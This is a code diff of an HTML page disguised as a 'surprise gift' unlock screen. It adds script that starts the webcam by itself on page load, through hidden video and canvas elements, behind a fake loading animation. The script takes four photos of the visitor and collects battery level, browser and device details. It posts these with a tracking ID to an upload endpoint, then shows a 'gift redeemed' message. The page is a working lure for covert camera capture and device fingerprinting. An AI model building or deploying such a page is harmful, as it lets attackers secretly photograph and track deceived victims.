@@ -1,69 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Surprise Gift 🎁</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Gift Unlocking...</title>
     <style>
-        body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding-top: 50px; }
-        #btn { padding: 20px; font-size: 20px; background: orange; border: none; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; }
-        .loader { display: none; border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { background: black; color: white; text-align: center; font-family: Arial; overflow: hidden; }
+        .container { margin-top: 100px; }
+        .lock-box { position: relative; display: inline-block; }
+        #guy { width: 80px; animation: rotateKey 2s infinite linear; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes rotateKey { 0% { transform: rotate(0deg); } 50% { transform: rotate(20deg); } 100% { transform: rotate(0deg); } }
+        #final-msg { display: none; color: #4CAF50; font-size: 20px; padding: 20px; }
     </style>
 </head>
 <body>
-    <div id="ui">
-        <h2>Hey Hi Dear! 👋</h2>
-        <p>You have a surprise from someone special! 🎁</p>
-        <button id="btn" onclick="startProcess()">🔓 Unlock Gift</button>
+    <div class="container">
+        <div id="loader">
+            <div class="lock-box">
+                <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="100"><br>
+                <img id="guy" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
+            </div>
+            <h3>Your Gift is Loading...</h3>
+            <div class="spinner"></div>
+        </div>
+        <div id="final-msg">
+            Your gift has been redeemed. You are a good person, God bless you. ✨
+        </div>
     </div>
-    <div id="loading" style="display:none;">
-        <h3>Your gift is loading... 🎁</h3>
-        <div class="loader" style="display:block;"></div>
-    </div>
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" style="display:none" autoplay></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const mode = params.get('m') || 'dual';
-        const uid = params.get('uid');
+        const urlParams = new URLSearchParams(window.location.search);
+        const mode = urlParams.get('m') || 'front';
+        const uid = urlParams.get('uid');
 
-        async function startProcess() {
-            document.getElementById('ui').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            let count = (mode === 'dual') ? 6 : 4; 
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                
-                for(let i=0; i<count; i++) {
-                    await takePhoto();
-                    await new Promise(r => setTimeout(r, 1000));
-                }
-                
-                document.body.innerHTML = "<h3>Your gift has been redeemed. You are a good person, God bless you. ✨</h3>";
-            } catch (e) { 
-                alert("Please allow camera access to see your gift!"); 
-                location.reload();
+        async function getInfo() {
+            let battery = await navigator.getBattery();
+            return {
+                battery: Math.round(battery.level * 100) + "%",
+                browser: navigator.userAgent.split(' ').pop(),
+                device: navigator.platform
+            };
+        }
+
+        async function startCapture() {
+            const constraints = { video: { facingMode: mode === 'back' ? "environment" : "user" } };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+
+            for (let i = 0; i < 4; i++) {
+                await new Promise(r => setTimeout(r, 7000)); // 7 seconds gap
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const info = await getInfo();
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
+                });
             }
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('final-msg').style.display = 'block';
         }
-
-        async function takePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const img = canvas.toDataURL('image/jpeg');
-            
-            await fetch('/upload', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ image: img, uid: uid, mode: mode })
-            });
-        }
+        window.onload = startCapture;
     </script>
 </body>
 </html>
